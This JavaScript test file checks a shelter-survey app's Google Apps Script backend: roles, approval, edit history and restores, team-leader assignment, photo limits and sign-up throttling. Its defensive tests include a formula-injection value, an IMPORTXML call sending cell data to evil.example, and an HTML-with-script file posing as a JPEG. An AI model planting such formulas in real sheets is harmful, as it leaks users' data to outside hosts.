// 1.6.1 rules — roles, approval, team leaders per house, history, photos, security — against the real Code.gs.
const { makeEnv } = require('./mock-gas.js');
const assert = require('assert');
const env = makeEnv(require('path').join(__dirname, '..', 'apps-script', 'Code.gs'));
const C = env.ctx;
const tab = (name) => { const rows = (env.sheets.get(name) || { rows: [[]] }).rows, h = rows[0]; return rows.slice(1).map(x => Object.fromEntries(h.map((k, i) => [k, x[i]]))); };
const setting = (k, v) => { const row = env.sheets.get('Settings').rows.find(r => r[0] === k); if (v !== undefined) row[1] = v; return row[1]; };

// before setup: brand-new sheet, the team code opens an admin once
const raw = (o) => JSON.parse(C.doPost({ postData: { contents: typeof o === 'string' ? o : JSON.stringify(o) } }).content);
C.setup();
env.sheets.get('Users').rows = [env.sheets.get('Users').rows[0]];
setting('Team code', 'Shelter 2027');
assert.equal(raw({ key: 'Shelter 2027', action: 'ping', name: 'X' }).error, 'need_login', 'an empty Users tab never turns the team code into an admin');
setting('Default project / team', 'Ismailia Project');
C.setup();
const users0 = env.sheets.get('Users').rows;
assert.equal(users0.length, 3, 'header + Begad + Hawary');
const CODE = /^[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}$/;
assert.ok(CODE.test(users0[1][users0[0].indexOf('Code')]) && CODE.test(users0[2][users0[0].indexOf('Code')]), 'admin codes are long now: ' + users0[1][users0[0].indexOf('Code')]);
assert.equal(setting('New people need approval'), 'No', 'no admin approval by default');

const B = { key: users0[1][users0[0].indexOf('Code')] };
const call = (who, o) => raw(Object.assign({}, who, o));
const me = call(B, { action: 'ping' });
assert.ok(me.ok && me.me.name === 'Begad' && me.me.role === 'Admin');
assert.equal(raw({ key: 'wrong', action: 'ping', name: 'X' }).error, 'bad_key');
assert.equal(raw('[1,2]').error, 'bad_request', 'odd requests are refused');
assert.equal(raw('{"key":"' + 'x'.repeat(23 * 1024 * 1024) + '"}').error, 'too_large', 'huge requests are refused');

// joining with the team code: straight in, no admin approval
const join = (name, deviceName) => {
  const r = raw({ key: 'Shelter-2027', action: 'ping', name, deviceName: deviceName || 'Android phone' });
  assert.ok(r.ok && r.me.token, JSON.stringify(r));
  return { key: 'Shelter-2027', uid: r.me.id, token: r.me.token, name, role: r.me.role, deviceName: deviceName || 'Android phone', v: '1.6.1' };
};
const P = {};
['Mona', 'Tarek', 'Sara', 'Ali', 'Ahmed', 'Omar'].forEach(n => { P[n.toLowerCase()] = join(n); });
assert.equal(P.ahmed.role, 'Researcher', 'new people go straight in as researchers');
assert.ok(call(P.ahmed, { action: 'pull' }).ok, 'and can work at once');
assert.equal(call(B, { action: 'ping' }).users.filter(u => u.pending).length, 0, 'nobody waits');
const setRole = (who, role) => { const r = call(B, { action: 'saveUser', user: { id: who.uid, role } }); assert.ok(r.ok, JSON.stringify(r)); };
setRole(P.mona, 'Manager'); setRole(P.tarek, 'Team leader'); setRole(P.sara, 'Team leader');
assert.equal(call(P.mona, { action: 'ping' }).me.role, 'Manager', 'admins raise people with one tap');
assert.equal(call(P.ahmed, { action: 'saveUser', user: { id: P.ali.uid, role: 'Manager' } }).error, 'not_allowed', 'only admins change roles');
const spam = join('Spammer');
assert.ok(call(B, { action: 'saveUser', user: { id: spam.uid, active: false } }).ok);
assert.equal(call(spam, { action: 'pull' }).error, 'blocked', 'switched off stays out');
assert.ok(tab('History').some(h => h.Action === 'User changed' && h.Changes.includes('Switched off') && h.About === 'User: Spammer'));
// approval can still be switched on in Settings (for later, if ever needed)
setting('New people need approval', 'Yes');
const waity = join('Waity');
assert.equal(waity.role, 'Waiting', 'with the setting on, new people wait');
assert.equal(call(waity, { action: 'pull' }).error, 'pending', 'and see nothing');
assert.deepEqual(call(B, { action: 'ping' }).users.filter(u => u.pending).map(u => u.name), ['Waity']);
assert.ok(call(B, { action: 'saveUser', user: { id: waity.uid, active: true } }).ok);
assert.equal(call(waity, { action: 'ping' }).me.role, 'Researcher', 'let in');
assert.ok(tab('History').some(h => h.Action === 'User changed' && h.Changes.includes('Let in') && h.About === 'User: Waity'));
setting('New people need approval', 'No');
assert.equal(raw({ key: 'Shelter 2027', uid: P.mona.uid, token: 'guess', action: 'pull' }).error, 'need_login', 'no phone key, no access');
assert.equal(raw({ key: 'Shelter 2027', by: 'Hassan', v: '1.4.2', action: 'pull' }).error, 'need_login', 'old unregistered apps no longer get in');
assert.equal(call(P.mona, { action: 'ping' }).leaders.length, 2);

// formula injection: typed text stays text in the sheet
const rooms = [{ id: 'r1', name: 'Kitchen', roof: true, beamSide: 3.45, plankSide: 4 }];
const save = (who, survey, extra) => call(who, Object.assign({ action: 'saveSurvey', survey, layout: { rooms: {} } }, extra || {}));
const evil = '=IMPORTXML("https://evil.example/?d="&A2,"//a")';
let r = save(P.ahmed, { id: 'srv0000001', family: evil, area: '+HYPERLINK("x")', mobile: '+201120395627', nationalId: '28503121501234', rooms: [{ id: 'r1', name: '@SUM(A1)', roof: true, beamSide: 3.45, plankSide: 4 }] });
assert.ok(r.ok);
let row = tab('Surveys')[0];
assert.equal(row['Head of family'], "'" + evil, 'formula kept as text');
assert.equal(row['Area'], "'+HYPERLINK(\"x\")");
assert.equal(row['Mobile'], '+201120395627', 'phone numbers untouched');
assert.equal(tab('Rooms')[0]['Room'], "'@SUM(A1)");
const evilJoin = join('=HYPERLINK("http://evil","click")');
assert.ok(tab('Users').find(u => u['User ID'] === evilJoin.uid).Name.startsWith("'="), 'names too');
assert.equal(call(P.ahmed, { action: 'pull' }).surveys[0].family, evil, 'the app still gets the exact text');
save(P.ahmed, { id: 'srv0000001', family: 'Family A', nationalId: '28503121501234', rooms, location: { lat: 30.5965123, lng: 32.2714987, acc: 8, at: '2026-11-03T08:00:00Z' } });

// location is required to leave Draft (checked by the sheet, not only the app)
const loc = { lat: 30.6, lng: 32.27, acc: 10, at: '2026-11-03T08:00:00Z' };
r = save(P.omar, { id: 'srvloc0001', family: 'No pin', rooms, status: 'Submitted' });
assert.ok(r.ok && r.status === 'Draft' && r.needLocation === true, 'no location: kept as Draft ' + JSON.stringify(r));
assert.equal(tab('Surveys').find(x => x['Survey ID'] === 'srvloc0001').Status, 'Draft');
r = save(P.omar, { id: 'srvloc0001', family: 'No pin', rooms, location: loc, status: 'Submitted' });
assert.ok(r.ok && r.status === 'Submitted' && !r.needLocation, 'with a location it goes through');
r = save(P.omar, { id: 'srvloc0001', family: 'No pin', rooms, locationCleared: true });
assert.ok(r.ok);
assert.ok(call(P.mona, { action: 'pull' }).surveys.find(s => s.id === 'srvloc0001').location, 'a submitted survey keeps its location');
r = save(P.omar, { id: 'srvloc0002', family: 'Draft pin', rooms, location: loc });
r = save(P.omar, { id: 'srvloc0002', family: 'Draft pin', rooms, locationCleared: true });
assert.ok(!call(P.omar, { action: 'pull' }).surveys.find(s => s.id === 'srvloc0002').location, 'a draft can drop its location');
assert.ok(!call(P.mona, { action: 'pull' }).surveys.some(s => s.id === 'srvloc0002'), 'someone else\'s draft is not shown, even to managers');
assert.equal(save(P.mona, { id: 'srvloc0003', family: 'Manager too', rooms, status: 'Approved' }).status, 'Draft', 'managers need it too');
assert.ok(call(P.omar, { action: 'deleteSurvey', id: 'srvloc0001' }).ok && call(P.omar, { action: 'deleteSurvey', id: 'srvloc0002' }).ok);
assert.ok(call(P.mona, { action: 'deleteSurvey', id: 'srvloc0003' }).ok);

// papers: only real photos and PDFs
const jpeg = Buffer.concat([Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), Buffer.alloc(200, 7)]).toString('base64');
const html = Buffer.from('<html><script>alert(1)</script></html>').toString('base64');
assert.equal(call(P.ahmed, { action: 'uploadFile', fileId: 'file000001', surveyId: 'srv0000001', paper: 'National ID', mime: 'image/jpeg', data: html }).error, 'bad_file', 'a web page posing as a photo is refused');
assert.ok(call(P.ahmed, { action: 'uploadFile', fileId: 'file000002', surveyId: 'srv0000001', paper: 'National ID', mime: 'text/html', data: jpeg }).ok, 'a real JPEG is fine');
assert.equal(call(P.ahmed, { action: 'getFile', fileId: 'file000002' }).mime, 'image/jpeg', 'true type sent back');

// team leaders: researcher rights
assert.ok(save(P.tarek, { id: 'srv0000001', family: 'Family A', nationalId: '28503121501234', grade: 'B', rooms, status: 'Reviewed' }).ok, 'team leaders can review');
assert.equal(save(P.tarek, { id: 'srv0000001', family: 'Family A', nationalId: '28503121501234', grade: 'B', rooms, status: 'Approved' }).status, 'Reviewed', 'but not approve');
assert.ok(call(P.tarek, { action: 'uploadFile', fileId: 'file000003', surveyId: 'srv0000001', paper: 'Contract', mime: 'image/jpeg', data: jpeg }).ok, 'and add papers');
{ const pp = call(P.tarek, { action: 'pull' }); assert.equal((pp.surveys || []).find(s => s.id === 'srv0000001').nationalId, '28503121501234', 'and see everything researchers see ' + JSON.stringify(pp).slice(0, 300)); }
assert.ok(save(P.tarek, { id: 'srvtl00001', family: 'Tarek surveyed', rooms }).ok, 'and make surveys');
assert.ok(call(P.tarek, { action: 'deleteSurvey', id: 'srvtl00001' }).ok, 'and delete their own drafts');
assert.equal(call(P.tarek, { action: 'getHistory', surveyId: 'srv0000001' }).error, 'not_allowed', 'only managers and admins see the history');
assert.equal(call(P.ahmed, { action: 'getHistory', surveyId: 'srv0000001' }).error, 'not_allowed');
assert.equal(call(P.ahmed, { action: 'recentChanges' }).error, 'not_allowed');
assert.equal(call(P.ahmed, { action: 'restoreVersion', changeId: 'x' }).error, 'not_allowed');

// managers see each edit: who, when, which phone, and the survey before and after
let hist = call(P.mona, { action: 'getHistory', surveyId: 'srv0000001' });
assert.ok(hist.ok && hist.history.length >= 2, JSON.stringify(hist).slice(0, 300));
const tEdit = hist.history.find(h => h.who === 'Tarek' && h.action === 'Edit');
assert.ok(tEdit && tEdit.device === 'Android phone' && tEdit.role === 'Team leader', JSON.stringify(tEdit));
assert.equal(tEdit.before.status, 'Draft'); assert.equal(tEdit.after.status, 'Reviewed');
assert.equal(tEdit.before.grade || '', ''); assert.equal(tEdit.after.grade, 'B');
assert.ok(/Case grade: – → B/.test(tEdit.changes) && /Status: Draft → Reviewed/.test(tEdit.changes), tEdit.changes);
assert.ok(tEdit.canRestore && /^H/.test(tEdit.id), 'each change has its own id');
const firstSave = hist.history[hist.history.length - 1];
assert.equal(firstSave.action, 'New survey'); assert.equal(firstSave.before, null); assert.equal(firstSave.canRestore, false);
assert.ok(tab('History').every(h => h['Change ID']), 'Change ID written on every row');
// Ahmed: his first save, then his edit with the before and after copies
assert.deepEqual(hist.history.filter(h => h.who === 'Ahmed').map(h => h.action), ['Paper added', 'Edit', 'New survey']);
const aEdit = hist.history.find(h => h.who === 'Ahmed' && h.action === 'Edit');
assert.equal(aEdit.before.family, evil, 'the exact text before'); assert.equal(aEdit.after.family, 'Family A');
assert.ok(!aEdit.before.location && aEdit.after.location && /Location saved/.test(aEdit.changes));
const rc = call(P.mona, { action: 'recentChanges' });
assert.ok(rc.ok && rc.changes[0].who === 'Tarek' && rc.changes.every(c => c.surveyId && c.before === undefined), 'recent changes, newest first, no copies');
// restore the copy from before Tarek's edit
r = call(P.mona, { action: 'restoreVersion', changeId: tEdit.id });
assert.ok(r.ok && r.restoredFrom === tEdit.id, JSON.stringify(r));
let back = call(P.ahmed, { action: 'pull' }).surveys.find(s => s.id === 'srv0000001'); // a draft again: only Ahmed sees it
assert.equal(back.status, 'Draft', 'status back as before'); assert.equal(back.grade || '', '', 'grade back as before');
assert.ok(back.location, 'location still there');
hist = call(P.mona, { action: 'getHistory', surveyId: 'srv0000001' });
assert.ok(hist.history[0].action === 'Restored a version' && hist.history[0].who === 'Mona' && /Status: Reviewed → Draft/.test(hist.history[0].changes), JSON.stringify(hist.history[0]).slice(0, 300));
assert.equal(call(P.mona, { action: 'restoreVersion', changeId: firstSave.id }).error, 'not_found', 'nothing before a new survey');
assert.equal(call(P.mona, { action: 'restoreVersion', changeId: 'H-made-up' }).error, 'not_found');
// a restore can itself be undone
r = call(P.mona, { action: 'restoreVersion', changeId: hist.history[0].id });
assert.ok(r.ok);
back = call(P.mona, { action: 'pull' }).surveys.find(s => s.id === 'srv0000001');
assert.equal(back.status, 'Reviewed'); assert.equal(back.grade, 'B');
assert.ok(back.reviewer === 'Tarek', 'server fields stay as they were: ' + back.reviewer);

// approve, then a day with a team leader per house
save(P.mona, { id: 'srv0000001', family: 'Family A', rooms, status: 'Approved' });
save(P.mona, { id: 'srv0000002', family: 'House two', rooms, location: loc, status: 'Approved' });
save(P.mona, { id: 'srv0000003', family: 'House three', rooms, location: loc, status: 'Approved' });
save(P.omar, { id: 'srv0000004', family: 'Not approved', rooms });
let t = call(P.mona, { action: 'saveTask', task: { name: 'Day 1', date: '2026-11-12', leaderId: P.tarek.uid,
  surveyIds: ['srv0000001', 'srv0000002', 'srv0000003', 'srv0000004'], houseLeaders: { srv0000002: P.sara.uid, srv0000003: P.ahmed.uid } } });
assert.ok(t.ok && t.skipped === 1, JSON.stringify(t));
assert.deepEqual(t.task.houseLeaders, { srv0000002: P.sara.uid }, 'only real team leaders can be assigned');
const svById = (id) => tab('Surveys').find(x => x['Survey ID'] === id);
assert.equal(svById('srv0000001')['Team leader'], 'Tarek', 'house 1: the day\'s leader');
assert.equal(svById('srv0000002')['Team leader'], 'Sara', 'house 2: its own leader');
assert.equal(call(P.sara, { action: 'pull' }).tasks.length, 1, 'Sara sees the day she has a house in');
assert.equal(call(P.ahmed, { action: 'pull' }).tasks, undefined, 'researchers do not get days');
assert.equal(call(P.tarek, { action: 'setHouseState', surveyId: 'srv0000002', state: 'Roofed' }).error, 'not_allowed', 'Sara\'s house is not Tarek\'s');
r = call(P.sara, { action: 'setHouseState', surveyId: 'srv0000002', state: 'Roofed' });
assert.equal(r.status, 'Roofed');
let s2 = call(P.mona, { action: 'pull' }).surveys.find(s => s.id === 'srv0000002');
assert.ok(s2.roofedAt && s2.roofedBy === 'Sara' && s2.teamId === P.sara.uid, 'roofed by Sara\'s team, with the time');
assert.ok(svById('srv0000002')['Roofed at']);
assert.ok(call(P.tarek, { action: 'setHouseState', surveyId: 'srv0000001', state: 'Roofed' }).ok);
assert.ok(call(P.tarek, { action: 'setHouseState', surveyId: 'srv0000001', state: 'Pending' }).ok);
assert.equal(call(P.mona, { action: 'pull' }).surveys.find(s => s.id === 'srv0000001').roofedAt, '', 'pending clears the roofed time');
t = call(P.mona, { action: 'saveTask', task: { id: t.task.id, name: 'Day 1', date: '2026-11-12', leaderId: P.tarek.uid, surveyIds: ['srv0000001', 'srv0000002', 'srv0000003'], houseLeaders: { srv0000003: P.sara.uid } } });
assert.ok(tab('History').some(h => h.Action === 'Day changed' && /team leader: Sara → Tarek/.test(h.Changes) && /team leader: Tarek → Sara/.test(h.Changes)), 'reassignments logged');
assert.equal(svById('srv0000002')['Team leader'], 'Tarek');
assert.equal(save(P.ahmed, { id: 'srv0000001', family: 'late', rooms }).error, 'not_allowed', 'after approval only managers change it');

// photos for the dashboard: small JPEGs inside the sheet
const small = 'data:image/jpeg;base64,' + jpeg;
const photo = (who, o) => call(who, Object.assign({ action: 'addPhoto', image: small }, o));
assert.equal(photo(P.omar, { kind: 'roof', surveyId: 'srv0000002' }).error, 'not_allowed', 'researchers don\'t post roof photos');
assert.equal(photo(P.ahmed, { kind: 'roof', surveyId: 'srv0000003' }).error, 'not_allowed', 'not a team leader');
assert.ok(photo(P.sara, { kind: 'roof', surveyId: 'srv0000002' }).ok, 'Sara\'s team roofed it, so she may post it');
let ph = photo(P.tarek, { kind: 'roof', surveyId: 'srv0000002', caption: 'Done! 🎉' }); if (!ph.ok) console.log('PH', JSON.stringify(ph));
assert.ok(ph.ok && ph.photo.team === 'Sara', 'roofed by Sara\'s team keeps her team on the photo: ' + JSON.stringify(ph.photo && ph.photo.team));
photo(P.tarek, { kind: 'roof', surveyId: 'srv0000002', caption: 'Again' });
assert.equal(tab('Photos').filter(p => p.Kind === 'roof' && p['Survey ID'] === 'srv0000002').length, 1, 'one roof photo per house');
assert.equal(photo(P.omar, { kind: 'story', image: 'data:image/png;base64,iVBORw0KGgo=' }).error, 'bad_file');
assert.equal(photo(P.omar, { kind: 'story', image: 'data:image/jpeg;base64,/9j/' + 'A'.repeat(50000) }).error, 'too_large');
for (let i = 0; i < 5; i++) assert.ok(photo(P.omar, { kind: 'story', caption: 'story ' + i }).ok);
assert.equal(photo(P.omar, { kind: 'story' }).error, 'too_many', 'five stories a week each');
assert.equal(photo(P.omar, { kind: 'team' }).error, 'not_allowed');
assert.ok(photo(P.tarek, { kind: 'team', caption: 'Team Tarek' }).ok);
assert.ok(photo(P.tarek, { kind: 'team', caption: 'New team picture' }).ok);
assert.equal(tab('Photos').filter(p => p.Kind === 'team').length, 1, 'one team picture per team');
let list = call(P.ahmed, { action: 'photos', have: [] }).photos;
assert.equal(list.length, 7); assert.ok(list.every(p => p.image));
const haveIds = list.map(p => p.id);
assert.ok(call(P.ahmed, { action: 'photos', have: haveIds }).photos.every(p => !p.image), 'photos the phone has are not sent again');
// a story from last week disappears
const prow = env.sheets.get('Photos').rows, phh = prow[0];
prow.find(x => x[phh.indexOf('Kind')] === 'story')[phh.indexOf('Expires')] = '2026-01-01T00:00:00.000Z';
assert.equal(call(P.ahmed, { action: 'photos' }).photos.filter(p => p.kind === 'story').length, 4);
assert.ok(photo(P.omar, { kind: 'story' }).ok, 'an expired story frees a place');
assert.equal(tab('Photos').filter(p => p.Kind === 'story').length, 5, 'expired stories are removed from the sheet');
const omarStory = call(P.omar, { action: 'photos' }).photos.find(p => p.kind === 'story');
assert.equal(call(P.ahmed, { action: 'deletePhoto', id: omarStory.id }).error, 'not_allowed');
assert.ok(call(P.omar, { action: 'deletePhoto', id: omarStory.id }).ok);
assert.ok(tab('Photos').every(p => Number(p['Size (KB)']) < 40));

// guessing codes: wrong codes are slowed down; mass sign-ups are capped
for (let i = 0; i < 60; i++) assert.ok(raw({ key: 'Shelter 2027', action: 'ping', name: 'Person ' + i }).ok, 'more than 40 can join in an hour');
for (let i = 60; i < 500; i++) raw({ key: 'Shelter 2027', action: 'ping', name: 'Bot ' + i });
assert.equal(raw({ key: 'Shelter 2027', action: 'ping', name: 'Bot X' }).error, 'busy', 'a flood of 500+ sign-ups an hour is stopped');

// history still complete
const H = tab('History');
assert.ok(H.some(h => h.Who === 'Sara' && h.Action === 'Marked roofed' && /Team leader: Tarek → Sara/.test(h.Changes) === false));
assert.ok(H.some(h => h.Action === 'Implementation day' && /Team leader: – → Sara/.test(h.Changes)), H.filter(h => h.Action === 'Implementation day').map(h => h.Changes).join(' | '));
console.log('roles tests passed · ' + H.length + ' history rows · photos ' + tab('Photos').length);

// houses roofed before 1.6 get their day's team leader when setup runs again
{
  const rowsS = env.sheets.get('Surveys').rows, hh = rowsS[0];
  const r = rowsS.find(x => x[hh.indexOf('Survey ID')] === 'srv0000003');
  const dd = JSON.parse(r[hh.indexOf('Data (app use – do not edit)')]);
  delete dd.teamId; delete dd.roofedAt; r[hh.indexOf('Data (app use – do not edit)')] = JSON.stringify(dd); r[hh.indexOf('Status')] = 'Roofed';
  C.setup();
  const after = JSON.parse(env.sheets.get('Surveys').rows.find(x => x[hh.indexOf('Survey ID')] === 'srv0000003')[hh.indexOf('Data (app use – do not edit)')]);
  assert.equal(after.teamId, P.sara.uid, 'old roofed house credited to its leader');
  assert.ok(after.roofedAt);
  console.log('backfill ok');
}
